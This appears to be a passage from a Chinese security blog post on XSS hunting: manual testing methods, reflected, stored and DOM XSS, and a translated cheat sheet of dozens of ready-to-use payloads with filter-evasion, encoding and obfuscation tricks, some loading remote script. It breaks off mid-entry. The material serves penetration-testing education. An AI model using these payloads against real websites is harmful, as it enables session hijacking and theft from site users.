title="漏洞测试"></a>漏洞测试</h2><p><strong>手动检测</strong><br>一个简单的思路为：</p><p>找到一个存在问题的地方，提交一下代码，如果出现弹窗或者打开开发者，发现报错，即为XSS漏洞<br>如果没有字数限制，可以将XSS的payloads一起发过去，会更好进行测试。<br><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt">XSS payloads</a><br>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(1)&lt;/script&gt;</span><br><span class="line">&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img/src=@ onerror=alert(1)/&gt; &#x27;&quot;&gt;&lt;img /src=@ onerror=alert(1)/&gt;</span><br><span class="line">&#x27; onmouseover=alert(1) x=&#x27;</span><br><span class="line">&quot; onmouseover=alert(1) x=&quot;</span><br><span class="line">`onmouseover=alert(1) x=`</span><br><span class="line">javascript:alert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;&quot;;alert(1)</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)</span><br><span class="line">&#125;x:expression(alert(1))</span><br><span class="line">alert(1)//</span><br><span class="line">*/--&gt;&#x27;&quot;&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/xmp&gt;&lt;/noframes&gt;&lt;/noframes?&lt;/plaintext&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>自动化检测</strong></p><p><a href="https://www.chainnews.com/articles/375843855401.htm">https://www.chainnews.com/articles/375843855401.htm</a></p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS,大多是通过<code>URL</code>传播的,那么就需要思考哪些地方会出现让<code>URL</code>地址的参数在页面中显示,一般就是搜索栏，尤其是一些大型网站的站内搜索，搜索的关键词会展示在当前的页面中<br>手工挖掘之前需要先逛逛网站有哪些功能点<br><strong>思路</strong>：见框就插，改数据包中的参数，改URL中的参数，js源代码分析<br>即：先在输入框输入唯一的字符串，查看源代码字符串的位置，在输入 &lt;&gt;””&#x2F;&amp;()看过滤了什么，根据过滤的字符来构造特定的xss代码</p><p>PS:谷歌内核浏览器自带XSS筛选器，所以对于反射型XSS测试，尽量不使用谷歌浏览器，可以使用火狐浏览器进行测试；</p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>存储型 XSS 的攻击代码是存在服务器端的，因此首先需要找到该网站将数据存储到后端的功能，然后进行payload的注入</p><p>评论留言处和个人资料处这些地方，存在存储型XSS漏洞的几率非常大；</p><p>同时也要看一下黑名单过滤规则，想办法进行绕过，比如通过编码转换、大小写混淆或者利用一些特殊的函数、标签来绕过黑名单；</p><h3 id="DOM-xss"><a href="#DOM-xss" class="headerlink" title="DOM xss"></a>DOM xss</h3><p>DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显</p><p>任何漏洞都是从外部输入加上危险的操作导致的，DOM型XSS也不例外</p><p>DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。</p><p>在进行漏洞挖掘时，注意观察用户输入的代码，若被前端JS文件解析，在客户端加载的JS代码中若存在一些前端的<a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">属性</a>即可能存在DOM-xss漏洞</p><p><a href="https://cloud.tencent.com/developer/article/1606858">DOM-XSS漏洞挖掘与攻击面延申</a></p><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p><strong>常规思路</strong></p><p>第一层：搜集输入、输出点，输入、输出的点越多，能挖到xss漏洞的概率越大（点搜集）</p><p>发现存活的标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;a&gt;&lt;p&gt;&lt;img&gt;&lt;body&gt;&lt;button&gt;&lt;var&gt;&lt;div&gt;&lt;iframe&gt;&lt;meta&gt;&lt;object&gt;&lt;marquee&gt;&lt;isindex &gt;&lt;input&gt;&lt;select&gt;&gt;&lt;keygen&gt;&lt;frameset&gt;&lt;embed&gt;&lt;svg&gt;&lt;math&gt;&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure><p>第二层：就是深入到各个点，进行各个击破</p><h4 id="XSS-Cheat-Sheet-2020-Edition"><a href="#XSS-Cheat-Sheet-2020-Edition" class="headerlink" title="XSS_Cheat_Sheet_2020_Edition"></a><a href="https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition">XSS_Cheat_Sheet_2020_Edition</a></h4><p><strong>1.HTML Injection （代码注入）</strong></p><p>当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加”-&gt;”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）</strong></p><p>当输入的payload，被插入到以下标签的内部时，使用以下标签：</p><p><code>&lt;title&gt; &lt;style&gt; &lt;script&gt; &lt;textarea&gt; &lt;noscript&gt; &lt;pre&gt; &lt;xmp&gt; &lt;iframe&gt;</code> （<code>&lt;/tag&gt;</code>为相应的html标签）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tag&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;/tag&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>3.HTML Injection - Inline （HTML注入-内联标签）</strong></p><p>当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（<code>&gt;</code>）进行闭合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onmouseover=alert(1) //</span><br><span class="line">&quot;autofocus onfocus=alert(1) //</span><br></pre></td></tr></table></figure><p><strong>4.HTML Injection - Source（HTML注入-源）</strong></p><p>当输入的payload，被作为以下HTML标签属性的值使用时：<code>href</code>，<code>src</code>，<code>data</code>或<code>action</code>。payload中的<code>src</code>属性值可以是一个URL或者<code>&quot;data:,alert(1)&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p><strong>5.Javascript Injection (javascript注入)</strong></p><p>当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br><span class="line">&#x27;/alert(1)//</span><br></pre></td></tr></table></figure><p><strong>6.Javascript Injection - Escape Bypass (javascript注入-绕过)</strong></p><p>当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;/alert(1)//</span><br></pre></td></tr></table></figure><p><strong>7.Javascript Injection – Script Breakout (javascript注入-脚本突破)</strong></p><p>当输入的payload，被插入到javascript标签块中的任何位置时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)</strong></p><p>当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（<code>if，else</code>，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#125;alert(1);&#123;&#x27;</span><br><span class="line">&#x27;&#125;alert(1)%0A&#123;&#x27;</span><br><span class="line">\&#x27;&#125;alert(1);&#123;//</span><br></pre></td></tr></table></figure><p><strong>9.Javascript Injection - Quoteless (javscript注入-无变量名)</strong></p><p>当输入的payload在同一行javascript代码中有多次反射时使用。</p><p>第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/alert(1)//\</span><br><span class="line">/alert(1)&#125;//\</span><br></pre></td></tr></table></figure><p><strong>10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)</strong></p><p>当输入的payload被插入到反引号<code>（``）</code>分隔的字符串内或模板引擎中时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;</span><br></pre></td></tr></table></figure><p><strong>11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)</strong></p><p>payload用于利用同一页面上的多次反射。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onload=alert(1)&gt;&lt;svg/1=&#x27;</span><br><span class="line">&#x27;&gt;alert(1)&lt;/script&gt;&lt;script/1=&#x27;</span><br><span class="line">*/alert(1)&lt;/script&gt;&lt;script&gt;/*</span><br></pre></td></tr></table></figure><p><strong>12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)</strong></p><p>payload用于利用同一页面上的多次反射。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/alert(1)&quot;&gt;&#x27;onload=&quot;/*&lt;svg/1=&#x27;</span><br><span class="line">`-alert(1)&quot;&gt;&#x27;onload=&quot;`&lt;svg/1=&#x27;</span><br><span class="line">*/&lt;/script&gt;&#x27;&gt;alert(1)/*&lt;script/1=&#x27;</span><br></pre></td></tr></table></figure><p><strong>13.Multi Input Reflections HTML Injection - Double &amp; Triple (HTML注入多输入反射-两次和三次)</strong></p><p>payload用于利用同一页面上的多个输入反射。在<code>HPP</code>（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p=&lt;svg/1=&#x27;&amp;q=&#x27;onload=alert(1)&gt;</span><br><span class="line">p=&lt;svg 1=&#x27;&amp;q=&#x27;onload=&#x27;/*&amp;r=*/alert(1)&#x27;&gt;</span><br><span class="line">q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>14.File Upload Injection – Filename (文件上传注入-文件名)</strong></p><p>payload用于用户上传的文件名返回在目标页面的某处时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;.gif</span><br></pre></td></tr></table></figure><p><strong>15.File Upload Injection – Metadata (文件上传注入-元数据)</strong></p><p>payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行<code>exiftool</code>（”$”是终端提示），并且可以设置任何元数据字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool -Artist=&#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;&#x27; xss.jpeg</span><br></pre></td></tr></table></figure><p><strong>16.File Upload Injection – SVG File (文件上传注入-SVG文件)</strong></p><p>上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为<code>&quot;xss.svg&quot;</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>17.DOM Insert Injection (DOM 注入)</strong></p><p>当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。</p><p>它适用于html标签和其他payload无效的情况下使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)</strong></p><p>当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text/html,&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">data:text/html,&lt;iframe src=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>19.PHP Self URL Injection (PHP self URL注入)</strong></p><p>当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠<code>（/）</code>在php扩展名和查询部分的开始<code>（？）</code>之间插入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;?a=reader</span><br></pre></td></tr></table></figure><p><strong>20.Markdown Vector (Markdown 组件测试)</strong></p><p>在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[clickme](javascript:alert`1`)</span><br></pre></td></tr></table></figure><p><strong>21.Script Injection - No Closing Tag (脚本注入-没有结束标记)</strong></p><p>payload在反射后的javascript代码中有结束脚本标签（<code>&lt;/script&gt;</code>）时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=data:,alert(1)&gt;</span><br><span class="line">&lt;script src=//brutelogic.com.br/1.js&gt;</span><br></pre></td></tr></table></figure><p><strong>22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)</strong></p><p>在<code>JavaScript</code>代码中有<code>&quot;message&quot;</code>事件监听器(如<code>&quot;window.addEventListener(&#39;message&#39;,...)&quot;</code>)时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据<code>http</code>请求 <code>X-Frame Options</code>标头）。 则另存一个<code>HTML</code>文件（或者使用<code>data:text/html</code>，以提供<code>TARGET_URL和INJECTION（xss payload）</code>进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=TARGET_URL onload=&quot;frames[0].postMessage(&#x27;INJECTION&#x27;,&#x27;*&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>23.XML-Based XSS (基于XML的XSS)</strong></p><p>该payload用于在<code>XML</code>页面(内容类型为<code>text/xml或application/xml</code>）中进行测试。如果输入点位于注释部分，则在payload前添加”-&gt;”；如果输入位于CDATA部分，则将”-&gt;”添加payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/x:script&gt;</span><br><span class="line">&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot; src=&quot;//brutelogic.com.br/1.js&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。</strong></p><p>第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。</p><p>第二个payload用于创建自己的<code>AngularJS</code>库时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&lt;x ng-app&gt;&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>25.Onscroll Universal Vector (通用Onscroll事件 测试payload)</strong></p><p>使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与<code>address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6</code>HTML标签一起使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=overflow:auto;font-size:999px onscroll=alert(1)&gt;AAA&lt;x/id=y&gt;&lt;/p&gt;#y</span><br></pre></td></tr></table></figure><p><strong>26.Type Juggling (类型戏法)</strong></p><p>该payload用于在web应用不够严格对比匹配数字的”if”条件中使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&lt;svg onload=alert(1)&gt;</span><br><span class="line">1&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>27.XSS in SSI (SSI中的XSS漏洞)</strong></p><p>该payload在服务器端包含<code>（SSI）</code>注入时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;!--%23set var=&quot;x&quot; value=&quot;svg onload=alert(1)&quot;--&gt;&lt;!--%23echo var=&quot;x&quot;--&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>28.SQLi Error-Based XSS (基于sql显注的XSS)</strong></p><p>该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;\</span><br></pre></td></tr></table></figure><p><strong>29.Injection in JSP Path (JSP路径中的xss注入)</strong></p><p>该payload可以在基于JSP的程序，测试应用的路径中使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//DOMAIN/PATH/;&lt;svg onload=alert(1)&gt;</span><br><span class="line">//DOMAIN/PATH/;&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)</strong></p><p>该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的”控制台”选项卡，是否有相应的<code>ReferenceError</code>，并相应地替换变量和函数名称进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);var myObj=&#x27;</span><br><span class="line">&#x27;;alert(1);function myFunc()&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><strong>31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)</strong></p><p>该payload用于web应用调用<code>bootstrap</code>库时进行测试。 <code>href</code>值的任何<code>char</code>都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过<code>Webkit Auditor</code>过滤器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html data-toggle=tab href=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>32.Browser Notification (浏览器通知)</strong></p><p>以下payload用作<code>alert()</code>，<code>prompt()</code>和<code>confirm()</code>函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notification.requestPermission(x=&gt;&#123;new(Notification)(1)&#125;)</span><br><span class="line">new(Notification)(1)</span><br></pre></td></tr></table></figure><p><strong>33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)</strong></p><p>该payload用于使用<code>MISS-MISS-HIT</code>缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将<code>TARGET</code>替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H &quot;Vulnerable_Header: &lt;XSS&gt;&quot; TARGET/?dummy_string</span><br></pre></td></tr></table></figure><p><strong>34.Mixed Case（大小写混合）</strong></p><p>该payload用于绕过区分大小写的xss过滤器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Svg OnLoad=alert(1)&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/Script&gt;</span><br></pre></td></tr></table></figure><p><strong>35.Unclosed Tags（未闭合标签）</strong></p><p>该payload在HTML注入中使用，可避免同时存在小于<code>（&lt;）</code>和大于<code>（&gt;）</code>符号的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)//</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p><strong>36.Uppercase XSS (大写 XSS)</strong></p><p>当web应用以大写形式返回用户的输入时使用该payload。 URL中将<code>&quot;＆&quot;</code>替换为<code>&quot;％26&quot;</code>，将”＃”替换为<code>&quot;％23&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SVG ONLOAD=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br><span class="line">&lt;SCRIPT SRC=//BRUTELOGIC.COM.BR/1&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p><strong>37.Extra Content for Script Tags (脚本标签的额外内容)</strong></p><p>当web应用过滤器查找带有某些变体的<code>&quot;&lt;script&gt;&quot;</code>或<code>&quot;&lt;script src = ...&quot;</code>但不检查其他属性时使用该payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/x&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>38.Double Encoded XSS (双重编码的XSS)</strong></p><p>当web应用程序对用户输入的内容执行双重解码时使用该payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E</span><br><span class="line">%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E</span><br></pre></td></tr></table></figure><p><strong>39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)</strong></p><p>当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert`1`</span><br></pre></td></tr></table></figure><p><strong>40.Alert without Parentheses (不带括号的弹窗)</strong></p><p>当web应用不允许使用括号并且PoC需要返回任意目标信息时，可在HTML标签或javascript注入该payload中使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setTimeout`alert\x28document.domain\x29`</span><br><span class="line">setInterval`alert\x28document.domain\x29`</span><br></pre></td></tr></table></figure><p><strong>41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)</strong></p><p>当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将<code>&quot;＆&quot;</code>替换为<code>&quot;％26&quot;</code>，将<code>&quot;＃&quot;</code>替换为<code>&quot;％23&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert&amp;lpar;1&amp;rpar;&gt;</span><br><span class="line">&lt;svg onload=alert&amp;#40;1&amp;#41&gt;</span><br></pre></td></tr></table></figure><p><strong>42.Alert without Alphabetic Chars (不带字母字符的弹窗)</strong></p><p>当前web应用不允许使用字母字符时使用该payload。以下是<code>alert(1)</code>的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[][&#x27;\146\151\154\164\145\162&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;]</span><br><span class="line">(&#x27;\141\154\145\162\164\50\61\51&#x27;)()</span><br></pre></td></tr></table></figure><p><strong>43.Alert Obfuscation (弹窗混淆)</strong></p><p>以下payload用于欺骗基于正则表达式（<code>regex</code>）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项<code>&quot;top&quot;</code>也可以替换为<code>&quot;window&quot;</code>，<code>&quot;parent&quot;</code>，<code>&quot;self&quot;或者&quot;this&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(alert)(1)</span><br><span class="line">a=alert,a(1)</span><br><span class="line">[1].find(alert)</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](1)</span><br><span class="line">top[/al/.source+/ert/.source](1)</span><br><span class="line">al\u0065rt(1)</span><br><span class="line">top[&#x27;al\145rt&#x27;](1)</span><br><span class="line">top[8680439..toString(30)](1)</span><br></pre></td></tr></table></figure><p><strong>44.Alert Alternative – Write &amp; Writeln (弹窗代替方案-Write &amp; Writeln)</strong></p><p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的<code>&quot;document.write&quot;</code>形式。 URL中将”＆”替换为”％26”，将<code>&quot;＃&quot;</code>替换为<code>&quot;％23&quot;</code>。 可以用<code>writeln</code>代替<code>Write</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">write`XSSed!`</span><br><span class="line">write`&lt;img/src/o&amp;#78error=alert&amp;lpar;1)&gt;`</span><br><span class="line">write(&#x27;\74img/src/o\156error\75alert\501\51\76&#x27;)</span><br></pre></td></tr></table></figure><p><strong>45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)</strong></p><p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于<code>Chromium</code>的浏览器中触发，并且需要<code>&lt;iframe name = 0&gt;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top.open`javas\cript:al\ert\x281\x29`</span><br><span class="line">top.open`javas\cript:al\ert\x281\x29$&#123;0&#125;0`</span><br></pre></td></tr></table></figure><p><strong>46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)</strong></p><p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换<code>eval</code>。<br>URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号<code>（+）</code>必须用URL进行编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg 